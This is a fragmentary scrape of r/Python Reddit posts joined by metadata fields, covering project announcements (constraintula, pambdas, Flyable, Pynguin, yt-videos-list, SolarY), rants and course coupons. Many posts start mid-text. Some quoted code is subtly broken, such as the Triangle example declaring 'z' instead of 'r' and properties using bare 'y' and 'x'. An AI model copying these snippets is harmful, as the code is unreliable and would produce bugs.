As it is basically a static code analysis, it can be used so in place of other Python SAST tools such as bandit, dlint, flake, etc... or to create company-wide audits of a source code but be aware of few differences with traditional SAST tools: Aura is much noisier than other SAST tools in terms of what it outputs because it's aim is to produce research data and look for anomalies in PyPI packages which are then aggregated together and audited by human security analysts rather than providing clear actionable results as other SAST tools are doing.

Although Computer Science was meant for College Students, I think, as a graduating grade-schooler, that they should make it more advanced.   


In my school, Grade School has just been studying Scratch 2.0. It was really annoying since we have been discussing the same things for 4 years straight. However, Python 3 could have been a much more efficient tool to teach programming. With its English-like syntax, the students may understand the flow of certain code. Since our teachers encourage research, the school may put up research assignments for topics. Example:  
\- For the next meeting, research print statements, and what it can do. We will discuss it next session.  


Second, our Grade School has really bad teachers. The teachers do not even know to troubleshoot. The best they can do is, teach Scratch. They do not even know how to teach simple programming theories. This class can clearly be called an abomination, because the other subjects such as Mathematics, Arts and Music, they hire national-class or sometimes world-class teachers. However, for the Computer Class, they simply assigned teachers that applied for English, CLE, or PE teachers for the job (exaggeration).   


Third. Even though our School is known to be innovative, in reality, one computer teacher does it all. He was kicked out after some time when he complained about these. Even my brother was really innovative. He has thought of multiple things such as digital-fair (they did not allow this, but allowed Smash Bros. Areas for some \*\*\*\*\*\*\* reason), and a lot of truly innovative projects. The School said "Nah, we don't have the funds" or "Nah, we can't do that for some \*\*\*\* reasons." When they say they do not have funding, they are lying. Guess where that goes to [EBSCO HOST](https://search.ebscohost.com/Login.aspx)(you will see the monstrosity after logging in), so many MacBooks that floods classrooms (not being used the right way), and weird \*\*\*\*.  


I just wanna say, YOU KNOW WHO YOU ARE, SCHOOLS.""|||Introducing constraintula|||Python|||1|||5|||1604482167|||""tl,dr: [Constraintula](https://github.com/DanielSank/constraintula)

# What problem are we solving?

When you write a with a set of attributes related by one or more mathematical constraints, how do you choose which ones go into `__init__`? For example, consider a class representing a right triangle:

    from dataclasses import dataclass
    
    @dataclass
    class TriangleSimple:
        x: float
        y: float
        r: float
        theta: float

As written, when instancing this class we have to provide all four parameters, but that's silly because these four parameters are not independent; they're related by the equations

    x**2 + y**2 - r**2 = 0
    tan(theta) - y/x = 0

`TriangleSimple` has two problems

1. We have to pass in four parameters when instancing, even though two should be enough, and
2. the class can be instanced with inconsistent values!

# Typical solution and limitations

A typical solution to fix both problems is to choose a subset of the parameters for initialization and expose the rest as properties:

    from dataclasses import dataclass
    import numpy as np
    
    @dataclass
    class TriangleProperties:
        x: float
        y: float
        
        @property
        def r(self) -&gt; float:
            return (self.x**2 + self.y**2)**0.5
        
        @property
        def theta(self) -&gt; float:
            return np.arctan2(y, x)

That's all well and good but wouldn't it be even better if we could optionally instance this class by providing e.g. `r` and `theta`? A typical way to do that is to add a classmethod:

    from dataclasses import dataclass
    import numpy as np
    
    @dataclass
    class TriangleProperties:
        x: float
        y: float
        
        @property
        def r(self) -&gt; float:
            return (self.x**2 + self.y**2)**0.5
        
        @property
        def theta(self) -&gt; float:
            return np.arctan2(y, x)
    
        @classmethod
        def from_r_theta(cls, r: float, theta: float) -&gt; 'TriangleProperties':
            return cls(x=r * np.cos(theta), y=r * np.sin(theta))

Not bad! Now we can instance our right triangle either from `x` and `y` or from `r` and `theta`, and in both cases the data are guaranteed to be correct.

Ok, now what if we want to be able to instance from `y` and `theta`? We could add another `from_` classmethod, but now we see that the number of such class methods grows combinatorically in the number of parameters, which is laborious, and what's worse is that we have to essentially rewrite the equations of constraint between the parameters for every possible set of independent variables.

# Constraintula

Here's a way better solution:

    import constraintula
    import sympy
    x, y, r, theta = constraintula.symbols('x y r theta')
    
    @constraintula.constrain([x**2 + y**2 - r**2, sympy.tan(theta) - y / x])
    @dataclass
    class Triangle:
        x: float
        y: float
        z: float
        theta: float
    
    triangle_from_x_y = Triangle(x=1, y=1)
    triangle_from_r_theta = Triangle(r=(1/2)**0.5, theta=np.pi / 4)
    triangle_from_x_theta = Triangle(x=1, theta=np.pi / 4)

Any possible set of independent parameters will work! Under the hood, \`constraintula\` solves the equations of constraint in terms of whichever variables you provide when instancing the class (and it caches the solutions for performance). The advantages here are

1. The equations of constraint defining the class are explicit, rather than hiding in the implementations of various properties.
2. Length of code is linear in number of equations of constraint, rather than combinatorical!
3. No chance of inconsistent data.""|||Back to Machine Learning Basics – Decision Tree &amp; Random Forest|||Python|||1|||0|||1604479418|||""https://preview.redd.it/g1fm35lgr6x51.png?width=1200&amp;format=png&amp;auto=webp&amp;s=abde3202b9aba7202e588ca154bdbd458917f35b

**Decision Tree** is one of the most popular machine learning algorithms. The secret of its popularity lies within its **simplicity** and ability to solve both [classification](https://rubikscode.net/2020/07/27/back-to-machine-learning-basics-classification-algorithms/) and [regression](https://rubikscode.net/2020/07/20/back-to-machine-learning-basics-linear-regression-with-python-scikit-learn-tensorflow-and-pytorch/) problems. Also, they are able to produce results with a small amount of data and the solutions it provides are easily **explainable**. This algorithm is exceptionally useful when it is used in ensemble learning, ie. they are an integral part of **Random Forest**, one of the most **powerful** machine learning algorithms. Learn how to implement these algorithms from scratch using **Python** and how to utilize implementation from the **Sci-Kit Learn** library.

The goal was to make is as identical as possible to Pandas, and even have it replicate the behavior of shared underlying data between Frames and slices/Series.

With this built, if I just needed the convenience of Pandas for dealing with a (small) dataset, but didn't want the headache of installing all the dependencies, I could just do a quick \`pip install pambdas\`. All under 1MB (or 188 KB).  


Currently supported:

* Indexing/assignment by .loc and .iloc
* Unary operators for Series
* Boolean Indexing
* Apply and ApplyMap
* Append
* GroupBy
* pambdas.concat
* pambdas.read\_csv  


The underlying data type is a simple Python list, and views are created but adjusting the slice (start, stop, and step). It was a bit of a pain, but oddly satisfying! It's not optimized, quite verbose (I handle each .iloc/.loc case independently), and is certainly very buggy. And since it's uses only pure-python, it is obviously much slower.  


A couple of comments about the process:  
1. My test file is over 1000 lines, and I'm still finding bugs.

2. It was important to get the indexing right.

3. It was fun developing the very basic functions (indexing, values, operators), and then bootstrapping with these to make much higher complexity processes.

4. Should have gotten the nans right from the start.

5. Testing square dataframes (e.g. 4x4, 5x5) was a bad idea...

I like the idea in speeding up Python by moving hard computations to fast C-type language (Golang), so i made this small package based on "ctypes" module.

It's working in 3 steps:

1. Write Golang code with "C" package imported, create export comments for function that you want to have access to;
2. Compile it to c-shared library;
3. Load library in Python and use lib's functions with proper file types setup.

As turned out, this is not so easy, i quickly ran into issues when Golang is starting to mess with mutable data types and pointers.

GitHub issue - [https://github.com/hermanTenuki/goinpy/issues/6](https://github.com/hermanTenuki/goinpy/issues/6)

As said in [https://golang.org/cmd/cgo/#hdr-Passing\_pointers](https://golang.org/cmd/cgo/#hdr-Passing_pointers):

&gt; Go is a garbage collected language, and the garbage collector needs to know the location of every pointer to Go memory. Because of this, there are restrictions on passing pointers between Go and C.   
&gt;  
&gt;. . .  
&gt;  
&gt; It is possible to defeat this enforcement by using the unsafe package, and of course there is nothing stopping the C code from doing anything it likes. However, programs that break these rules are likely to fail in unexpected and unpredictable ways. 

For now, my package **can be used for simple cases**, look at [https://github.com/hermanTenuki/goinpy#how-to-use](https://github.com/hermanTenuki/goinpy#how-to-use).

&amp;#x200B;

Recently, I saw a few Python accelerators getting a lot of attention, and I thought it would be a good time to finally present what I have been working on for the last year. I recently opened the free registration for the private beta, so you guys can register to try it out at [www.flyable.dev](https://www.flyable.dev) !

&amp;#x200B;

Flyable is an ahead-of-time compiler that takes your Python code, analyses it, and outputs very optimized machine code. A little bit like a C compiler does but for Python. 

Micro-benchmarks show that it produces programs that run between 10-70x time faster than Python. Flyable is certainly one of the fastest and easiest ways to accelerate your Python code. It finally allows Python compete in the ring of fast and efficient languages without having to add nasty non-python stuff that some other implementations need.

Here a small demonstration (1 min) :

Pynguin is an automated unit test generation tool for Python, similar to tools like Randoop or EvoSuite for Java.

It is a research prototype and still has a lot of limitations.


Example:

Suppose you have written a function like the following:

    def triangle(x: int, y: int, z: int) -&gt; str:
        if x == y == z:
            return "Equilateral triangle"
        elif x == y or y == z or x == z:
            return "Isosceles triangle"
        else:
            return "Scalene triangle"
            
Pynguin will try to generate a test suite which achieves full branch coverage.
A test may look like this:

    def test_case_0():
        var0 = -2603
        var1 = module0.triangle(var0, var0, var0)
        assert var1 == "Equilateral triangle"

Has sections for note taking, marking videos as watched, marking videos to rewatch, and a link to every video posted by that channel 🤓|||Python|||1|||1|||1604297517|||""# Overview

I wanted to have an easy way to take notes on videos I watch on YouTube, and ended up making a Python package to automate the process of scraping all the videos posted by a particular channel. This package is **specifically for scraping videos posted by** ***one*** **channel**, and does not support scraping info from multiple channels or linking related videos.

Quick start:

    pip3 install -U yt-videos-list     # MacOS/Linux
    pip  install -U yt-videos-list     # Windows
    
    python3     # MacOS/Linux
    python      # Windows
    
    
    
    from yt_videos_list import ListCreator
    
    my_driver = 'firefox' # SUBSTITUTE DRIVER YOU WANT (opera, safari, chrome, brave, edge)
    lc = ListCreator(driver=my_driver, scroll_pause_time=0.8)
    
    
    lc.create_list_for(url='https://www.youtube.com/user/schafer5')
    lc.create_list_for(url='https://www.youtube.com/channel/UC8butISFwT-Wl7EV0hUK0BQ')
    
    
    # see the new files that were just created:
    import os
    os.system('ls -lt | head')                      # MacOS/Linux
    os.system('dir /O-D | find "_videos_list"')     # Windows
    
    # for more information on using the module:
    help(lc)

For more info about the API and debugging common setup problems, see the [short API guide I made for this package here](https://github.com/Shail-Shouryya/yt_videos_list/blob/master/python/README.md). The API guide also has more configuration information as well as options about which driver to use, so check that out if you want a better idea of what you can do! :)

# Background

I started working on a project last year where I would scrape some metadata (title, link, video number) of all videos uploaded by a YouTube channel to take notes on videos I watched. It started off as a single `.py` file where I would go in and change parts of the code to run it on another channel, to a couple modules where I could run the program from the Python interpreter without having to remember to change 5-6 parts of the program, to eventually an entire package.

The initial goal was just to make a script for me to get the videos of 2 channels I watched frequently so it'd be easy for me to take notes on the videos I watched, but I figured this was something that others would find useful too, so I tried to modularize it and make it as user friendly as possible.

This package uses Selenium, and since I wanted this package to be cross platform AND easy to use, I added additional logic (check this submodule) to automatically download the relevant Selenium drivers for whichever browsers you already have. This was super important since setting up Selenium was a nightmare for me the first time (you need to configure path variables if you download it from one place but not another, or you need to move it after you download it, or you need to unzip it, etc...), so the logic I added uses `curl` and `tar` to download the binaries directly and then places the binaries in a location where ***you*** don't need to configure anything.

I also added tests [here](https://github.com/Shail-Shouryya/yt_videos_list/tree/master/python/tests) (see the `run_tests.sh` and `run_tests.bat` files for an overview) that check to make sure the output files created by the program are consistent (uses hashes to compare expected file to output file) every time and across platforms. This was also a source of error initially since Windows uses CRLF line endings and \*nix typically use LF endings, so I *thought* that would require manual modification, but turns out it doesn't that required a bit of tinkering to get right ([this](https://github.com/Shail-Shouryya/yt_videos_list/commit/0fc42d504e662552232be33ae5fa0d005c0c5fab) is what I incorrectly did the first time, and [this](https://github.com/Shail-Shouryya/yt_videos_list/commit/63cb9660887627aa3f28c3385d23d9d775977d23) is the fix after I realized the problem, and [this](https://github.com/Shail-Shouryya/yt_videos_list/commit/fc278e3af1a944940996d2c5a164f8ed82184cf8) is the additional configuration you need to do to synchronize output for csv files).

I also added a [custom minifier](https://github.com/Shail-Shouryya/yt_videos_list/blob/master/python/minifier.py) that shrinks the source code to save space, so it takes all the code from the `dev/` directory and strips whitespace and comments before recreating it in the `yt_videos_list/` directory. The goal here was to create a kind of minifier similar to the one used by front-end frameworks to shrink the shipped code to minimize bandwidth usage. I realize this isn't something that's typically done in Python, but I figured since most users just `pip install`  
 the package and rarely look at the actual source code, this could be something I could do - it was also kinda fun! 

All this said, I was wondering if there's anything else I can do to make this project better. I'm mainly looking for feedback on design choices and readability, since these 2 things tend to cause the most problems when someone starts working on a new codebase, but if any of you have other feedback I'd love to hear it!

Some additional notes:

 I realize PEP-8 encourages adding line breaks for long lines, but I found the line breaks very annoying and ignored that rule (C0301).

 PEP-8 also has a rule about not having more than 1 statement on 1 line (C0321) and having only 1 space before a variable assignment (C0326), and I ignored these rules too so that all the variable assignments lined up vertically and were easy to find when skimming through the code.

 I also didn't add docstrings for all the non-public functions, classes, and methods (C0114, C0115, C0116) since the point of creating this package was to hide away all the implementation details - I didn't want to explain the things I wanted to abstract away. If someone is looking through these methods and functions though, I made sure to give descriptive names to the variables, functions, and methods so it would be easy to figure out what they do just by looking at the name.

 I'll add support for Linux when I get the chance

(I messed up this month and NOV2020FREE is the discount, but not free, code. Whoops.)

This promo code works until the 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later. I'll change it to NOV2020FREE2 on the 4th.

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month.

**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in late-2020. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be "good at math" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a "gym buddy" to learn with.""|||Is there a way to make this faster?|||Python|||1|||2|||1604266091|||""[removed]""|||is python more capable than lua|||Python|||1|||32|||1604265554|||""why do people use python instead of lua

Now, I am reasonably skilled in python, I believe. Don't write OOP and class-based python unless I am doing more than 100 lines of code. Most often write pretty simple stuff but most of the time goes into problem-solving.

But I despise freelancing. 1 out of every 3 comments/posts I make on Reddit is how much I hate doing freelancing. I come to Reddit to vent so I am sorry to the fella who is reading this because they is more or less my punching bag :(

So, today I am going to rant about one of the more ""fun"" things of freelancing, client telling me they know python.

Whenever a client tells me that they know python, I try to ignore them but often times I have to entertain the idea anyway because jobs are scarce. I keep telling myself "maybe this will work out great" but it doesn't.

It never goes right. Here is the thing. If you do what I do you will realize the code is often quite simple. Most of the effort goes into problem-solving. So when the client sees the code and me getting paid by the hour, "They are like I thought you are *best darn python developer* I could have written that myself!"

My immediate impulse is to go on a rant and call that person something rotten. But I have to maintain "professionalism".

Then there is the issue of budgeting. I do fixed payment contracts for smaller engagements. But oftentimes these python experts will quote me something that is at least one-fourth of a reasonable budget. And by reasonable I mean non-US reasonable budget which is already one-fifth of a reasonable US programming project budget. But anyway they quote that because they know how is easy it is to do my job.

There is more because this is rant by the way. So, clients with python knowledge will say to me "I have this python file..." which is the worst thing to say at this point. They think they have done the "majority" of the work. But here is the way I see it-

a. Either they have just barely scratched the surface
b. They have a jumbled up mess
c. They had another dev look into the project who already failed
d. They had to do a "code review" of their previous freelancer and they ended up stealing the code

There is no positive way to imagine this problem. I have seen too much crappy code and too much of arguments like "they had done the work for me, so I should charge near to nothing".

People don't know exactly why senior devs get paid so much money. Junior devs write code, senior devs review code. That is why they get paid more. Making sense of other people's code is a risky and frustrating thing and it could be incredibly time-consuming. And moreover in most cases building upon a codebase is more difficult than writing it from the scratch.

Doctors rant about "expert" patients earning their MDs from WebMD and I am seeing the exact same thing happen to me with clients knowing how to write loops in python.

Python is easy to learn, programming these days is easy to learn. But people are not paying programmers for writing loops and if statements. They are paying them to solve problems. Knowing the alphabet doesn't make you a poet. And yes in my eyes programming is poetry.""|||Beginner|||Python|||1|||2|||1604262237|||""[removed]""|||Facebook Messenger - Bwst way to scrape messages?|||Python|||1|||0|||1604260964|||""I want to create an NLP bot to reply to my friends messages.

I have an idea that want to know if is possible before I even dive deeper into it. I work in real estate and there are these companies that take calls for appointments for properties. Really simple, they just tell them their name and address of property and then they forward the message to me. And they charge a lot of money to do so. I was thinking if I could make something using something like Google Duplex, that would say something like "Hello, you have reached Bemo, what address and time would you like to schedule?" and then I would get an email with the information and the recording of the call. That way I don't have to be on my phone all the time waiting for a call to show up. Of course, I would also have my phone number in the listing information in case it does not work.

Note that it's essentially a note-taking tool instead of a static code analysis tool, so that you still have to fill in some fields to build a graph to represent relations between functions.

Creating projects from call graphs (`.dot` file) is also supported, but content of functions won't be available due to the format of call graph file.

Hope you all can enjoy it!

And feel free to create an issue or send a PR if you have any question or feature request about this tool.

* Total stickers
* Number of stickers in a pack
* Pack cost

And calculates the average cost of completing an album by running simulations of collecting.

The parser isn't perfect, but so far the script has been usable. I know this is a simple silly script but hopefully it will help someone else.

There are some idiosyncrasies about the Indeed search algorithm that may cause some discrepancies in the results. I would recommend using specific search terms with longer intervals, but I haven't been able to test everything as there aren't a lot of listings on weekends. By default the search checks for listings posted in the last day, and the first search will take a bit, as it finds all results for that period.

Then the script outputs some transformation of that data, without using additional RAM, and then the script prints that it's done and exits.

In practice, the script runs for about an hour and then prints the final line, but takes about an extra hour to release the memory and actually exits. I suppose it's the garbage collector taking that extra time, since CPU usage is at 100% on one core, but I don't understand why it should take this long. I could press Ctrl+C and immediately release all memory, so why doesn't Python do the equivalent of this internally rather than spend an hour releasing the memory?

I've also noticed this in general when interrupting scripts: you press Ctrl+C a first time and it can hang for about a minute if you have a lot of data in ram (something like 16G), and you can either wait for the release or press Ctrl+C again and it immediately dies and releases.

In the last couple of weeks and months I used these tough times and lockdown periods to write down my Python knowledge in a particular scientific field: Space Science ... more precisely: Space Science within the Solar System. I studied Physics, later Astro- and Geophysics and was focusing on small bodies in our cosmic vicinity, namely asteroids, Near-Earth Objects, meteors and cosmic dust.

During that time and later during my doctorate studies I worked on ESA's comet mission Rosetta / Philae, and later I was part of the "Cosmic Dust Analyzer" team on-board the NASA mission Cassini-Huygens. These were great times and I could probably write a small book about my astronomy and science passion! Or I could bother you A LOT with long posts about it.

Anyway, in science / academia one tries to find, explore or analyse and determine something "new". New insights ... new models of anything ... providing a small puzzle piece for this big cosmic mosaic. But every scientific work, either as a Bachelor or Master student, as a doctorate candidate or post-doc: data analytical and scientific work require some kind of fundament (*Standing on the shoulders of giants*). And I am not only talking about previous papers or research projects. No, it is also about code and programming.

Python is used by a lot of scientists and students. I do not need to provide you any reasons why it is being used (insert smug face here). But most projects face an issue: redundancy. Different projects require the same computational fundaments, equations, formulae. For example in Space Science: computation of the brightness of asteroids as seen from the Earth; the dust and gas production rate of comets depending on the distance to the Sun; forces that apply on dust particles or the computation and determination of meteor streams (falling stars). Students and scientists search in papers and books for the equations, code them, test them (sometimes) and search for most recent data sources, either some spacecraft mission data or models.

That is A TON of work ... the beloved "yeah I need to dive deep into papers and equations hundreds of students did before, but since they left the university and institute already I have to start from scratch ..." - work.

Now I am not working anymore in academia, so there is no paper or project pressure. I can re-focus on science as I did before: as a hobby astronomer with some more experience and knowledge now. And I am eager to contribute something that could help Pythonistas, free time coders, scientists and students alike: A Solar System related Python library called: ***SolarY***

The library will focus on small bodies in the Solar System, and consequently, sub-modules will cover topics like:

* Asteroids
* Comets
* Near-Earth Objects
* Meteors
* Meteoroids
* Cosmic Dust
* Spacecraft mission data and function
* Miscellaneous, generic functions that are needed

There is no first version yet, but I am working on it. Take a look at the current status here: [https://github.com/ThomasAlbin/SolarY](https://github.com/ThomasAlbin/SolarY). Some modules are already documented so you get a feeling here the journey will go.

I am working on it in my free time, slowly but steadily and I hope to contribute something that gathers all the nice information that are needed for anyone who wants to do some citizen science projects.

In the meantime I am working on a REST-ful API service for a NASA toolkit called SPICE. SPICE is a mighty tool that helps one to compute the position of any celestial body. However, for beginners it is difficult to install, configure and run it. A simple REST API that will be published too will extend the functionalities of SolarY.

If you are interested in it, or if you want to contribute, please let me know. You can write me here, you can get updated on [Twitter](https://twitter.com/MrAstroThomas), or check also current updates on my [Medium](https://medium.com/@thomas.albin) blog. I know, this project is a niche thing, but hey, some people I know are already checking the scripts out, and I am having a lot of fun doing it.

In the meantime: keep the spirit up. A nice project (programming, writing, drawing, anything) may help in these challenging times to find a purpose.

Best,

Thomas""|||I made an image to ASCII converter using PIL!|||Python|||1|||3|||1604163391|||""Example - [https://imgur.com/a/8sm9ncW](https://imgur.com/a/8sm9ncW)

Hey folks

I'm super happy to say that my jobboard at https://www.solists.com/ is live. This started as a pet project of mine as I started to work in Django, and has been an absolute joy to build. Coming from the front-end world, having a mature framework to use was a pleasure.

I chose a jobboard since I was fed up with the job hunt process (get contacted by recruiters, and by the third interview with a company realize that the job that they posted was not the JD after all. Seriously, why), and so a resource that actual research went into to verify the posting, the salary etc, and plus I wanted a place for not just developers, but designers as well. I have some tentative plans to make a resource for developers and designers to 'discover' each other to form partnerships for freelance/ contract work, and this is a few steps in that direction.

There are a few more features I want to add in, and a few rough edges to smooth out, but as a MVP I am fairly happy with it.

Let me know what you all think, and I'd really appreciate anything that didn't work well with you in the site, or if you could share your experiences as either a job hunter or a job poster, in what an ideal experience would be and frustrations with existing platforms/systems.

I'd like to tell you about Ryven, which is a new python based visual scripting software I made during this year. I just want to receive some more interested people's comments and ideas :)

https://preview.redd.it/0mshj4ksbew51.png?width=1355&amp;format=png&amp;auto=webp&amp;s=78504672c0a7851f06d2684badee24dacaae1dc2

I made Ryven with focus on simplicity and transparency to make it a useful tool for educational or shocasing purposes (but it already gets used for more). Some main elements are:

* There are data *and* execution connections, meaning it's not a pure dataflow software, but pure dataflows are possible and you can choose a suitable mode for the algorithm executing the script
* A node can execute *any* python code, no limitations, which was a major goal.
* It is not a software for learning how to program or for generally programming in python. Just like everything else above the language itself, it has use cases and applications. But still, it's surprisingly unrestricted, meanwhile including even a few quite ridiculous (and cretainly unsafe :D ) features like the live source code manipulation of nodes.

Thank you in advance""|||I was bored of continuously creating posters for work, so I created a library to do it for me!|||Python|||1|||6|||1604101818|||""So like a year ago, I worked in handling the promotion and publication for a company product. One of my common day to day task was creating promotional, informative, or motivational posters to share on the company social media page. At first, I didn't mind it but over time, it got to a point where it became really tedious as I continuously have to change the same poster format but just replacing the colors and text or modifying poster elements. Not to mention, I was using photoshop which was kinda slow to work with for me.

Then one day, it hit me. I was learning Python at the time and I figured, why not create a script to automate creating the posters for me.  I definitely didn't think it was easy but I wanted to give it a try. Plus, it will be my first useful real-world project I made instead of the tutorial projects. Mind you, I was not consistent at all when building the script. There were many times I procrastinated a lot or even get burnt out when I couldn't figure the parts I needed to implement. But regardless, the frustration of creating the posters motivated me to continue working on the script. After 1-2 months, I was done with the script and it totally worked! 

It helped me a lot at work. It was built with Pillow. It wasn't perfect, but it was enough to get the posters done as they were not too complicated. I created a script where I could create a template for any type of poster and  I only need to change the text or color, which really reduced the unnecessary tedious work for me. I also didn't tell the people at work about my script as I was afraid they might increase my workload or worse.

After I left work, I stopped using the script for a long time. I didn't really see my script as a big deal at the time but as I continued to learn python, I figured why not just turn my script that was my only useful project into a library and make it open-source rather than just being a very simple forgotten one-time script. Also, at the time, I was struggling to really understand OOP. It was the best way to get my hands dirty and learn OOP.

So after many months of work and procrastination, I'm finally done! I am sure it is not perfect and there will be a lot of mistakes in my code. That is why I want to open-source it so that not only will it benefit someone somewhere but I will also learn from contributors that make changes to the code. I welcome any constructive criticism. In my journey of learning, I didn't really have a real-world experience or mentor when it comes to working with code as I was self-taught. I am curious to see how far this project will help me improve as a programmer. Also, having an interesting experience to talk about at meet-ups would be cool.

Here is my [project](https://github.com/amajai/niceposter). 

I even made an effort to make look presentable and legit as best I could. I will still need to work out how to do documentation and implement error handling.  I would appreciate it if you guys could check it out and give a review. Also, give it a star if you like.

Thank you.

&amp;#x200B;

I made this project a couple months ago, but never bothered promoting it, so here I am. The app is called **pastemngr**.

&amp;#x200B;

**What it is?**

Paste manager (pastemngr) is a command line tool for pastebin.com. By consuming the pastebin service API, this tool has the hability to create and retrieve pastes from the command line as well as fetching information regarding users and pastes (locally and online).

&amp;#x200B;

**Highlights**

One of the highlights of this program is that, when you post a paste under a username, the paste is also stored locally, so if it gets removed for any reason, you will still keep it in your local environment.

&amp;#x200B;

**Source code**

The source code can be found here: [https://github.com/pvpscript/pastemngr](https://github.com/pvpscript/pastemngr)

&amp;#x200B;

**Installation**

To install it, simply run: `pip install pastemngr`

&amp;#x200B;

**IMPORTANT**

In order to use the pastebin API, a developer key is required, so it's necessary that you create an account and get its dev\_key, so that the program can work properly. So, make sure to read the readme carefully before posting any questions.

**Note that the key is just to make this tool work, you can still publish pastes under the 'guest' user.**

&amp;#x200B;

For extra help, refer to the `pastemngr(1)` manual page.""|||N+1 Problems are a major performance problem when using an orm such as django-orm if it is not targeted well. So I have created a package to solve the problem for django-orm. It automatically creates an optimized query for a rest-framework serializer.|||Python|||1|||0|||1604089988|||""Hi all,

As stated in the title I have created a package to solve n+1 problems. ( If you do not know what n+1 problem is you could visit [this stackoverflow post](https://stackoverflow.com/questions/97197/what-is-the-n1-selects-problem-in-orm-object-relational-mapping). ) We are using it in our 2 mid-sized projects in our company and it seems to be working but it would be great to hear other developers' opinions and feedback. 

**Simply what it does:**

What django-rest gives us is the ability to know what will be accessed from the object before it is accessed by inspecting the source attribute of the fields defined in a serializer.

Auto-Related finds and traces those sources back on django field instances and translates them to select\_related, prefetch\_related and only methods of django orm. Note that it does not use rest-framework fields to decide what to prefetch but django fields because what django-rest says a related\_field may not be a related field for the django or vice versa.

If you are interested and have faced similar issues with n+1 problems in django you can check it out on [django-auto-related](https://github.com/thetarby/django-auto-related). Also a more detailed text about how it is working is in the readme. I would be glad to hear any feedback.

I wanted to show my Led control server that I made for my home. It's loosely inspired by philips hue and their ability to control lights from you smartphone.

I made a webserver that serves a WebApp where you can control all you lights in your house(when they are connected to this program ofcourse). For now it supports APA102 LEDs, LEDstrips controlled by an arduino via serial and wifi enabled LEDstrip through an esp01.

I am just finished with the redesign of the ui and converted the colorspace from rgb to hsv. 

I pasted a picture of the interface under here. This is when everything is uncollapsed. All the cards can be collapsed and you will only see the first card(with bed and livingroom in it) as you can see in the picture beneath.

The brightness slider will change color according to the color of the colorhweel. When the lights are of the brightness slider will still show the color that was last used, and that is also the color that the lights will be when you turn them on.

The top card and top colorwheel control the whole room(so set alll lights on/off or to a color) and beneath that you can change the colors/functions per light. If you all lights have different colors the whole room will show an average of those colors. Also when you turn off and on the whole room all colors and functions will be remembered. A feature i'm thinking about is the ability to save 'scenes' like you can in philips hue.

I posted this all on my github: [GitHub](https://github.com/bluhb/LEDServer)

Hope you guys like it! Tips, feature ideas or anything is always welcome!

I have been thinking about a project to build a bridge between my daily tasks that are already semi automated. To bring them under the same umbrella is probably the next step in getting it as automated as possible.

I am responsible for installing/configuring/supporting an office of 500+ ppl laptops with an other dude and this comes with just an insane number of manual tasks especially when the company goes on a hiring spree. On top of this we do not have unlimited access and control over the infrastructure so we have to roll with whatever the org decided to be necessary for security and what not.

In the past year I put together a .ps1 script that we use on fresh installs to do the necessary config, install about 10 - 15 apps, log user and computer details into a file, check certain physical components like memory manufacturer and a few other things. Nothing fancy but ultimately useful as it saves about 2 hours / laptop for us. 

I have found the selenium browser extension a few months ago and created a project for doing the tickets after this install / config is done to create a lot of tickets in (SNOW) for the config process. ( Management really only cares about ticket numbers so it got to be done. )But I have to manually swap the user id for each batch of tickets before starting it again ( find and replace )This also saves about 30 minutes + laptop that we don't need to spend on manually generating tickets but it would be preferable to do it all in one go without my intervention.

The last bit is assigning the devices to the users which at this point is done manually 2 times. Once in the official stock management system and once in an excel file for ourselves just so we know what we have in the office as the official tool has been unreliable for months and nobody likes to do manual stock counts. Every. Single. Week. because of a faulty tool.

So this is what we have currently. 

The idea would be to have the initial script log the details that we need ( user id / computer name / timestamp / serial no / memory manufacturer. ) On to a sharepoint site. 

Once the config is done we would do the tickets using python with the help of selenium. It would look up the records on sharepoint. Create the tickets and once its done it would tick the tickets done field.

Same process for assigning devices to the users ( do the change and tick the stock done box on sharepoint ) and logging stock movement in our offline file via python.

At the moment this is what I thought up, with not much python experience but it seems doable and probably complex enough to keep me occupied and interested while also learning python with a tangible reward at the end ( saving sweet sweet time ).

If you guys have an idea to do it better or to add / remove something to/from the process I would be happy to hear it.

Hello All,

I am a beginner in Python. I started learning python almost 6 months ago. So far, I am loving the journey. This week, I created a first real / useful project using Python. It is a pdf editor (using PyPDF2 module). The program as of now can merge different files together, remove pages from file and rotate page / range of pages from a file. I have also built executable file using PyInstaller. I would like experienced Python users in this community to review my code and suggest improvements. I know that the code I have written is not the efficient one and I would definitely like to work on it to make it better.

Another thing, I am currently learning Object Oriented Python. Therefore, I tried applying concepts of classes in my code. I may not have correctly applied classes or not used Object Oriented power of Python correctly. I would also like to hear from you guys on how can I improve classes in this program.

I have attached a link to the GitHub repository of the program. I would also appreciate general comments on my programming style and if other experienced using could provide other resources to learn.

Link to the GitHub Repository is below:

[Part 1 (notebook)](https://github.com/mpkocher/Functional-Programming-Techniques-In-Python/blob/main/Functional-Python-Part-1.ipynb) starts with different mechanisms of how to define functions in Python and quickly moves to using [closures](https://en.wikipedia.org/wiki/Closure_(computer_programming)) and `functools.partial`. We then move on to adding `functools.reduce` and  composition with [compose](https://gist.github.com/mpkocher/9896022) to our toolbox. Finally, we conclude with adding lazy `map` and `filter` to our toolbox and create a data pipeline that takes a stream of records to compute common statics using a max heap as the reducer.

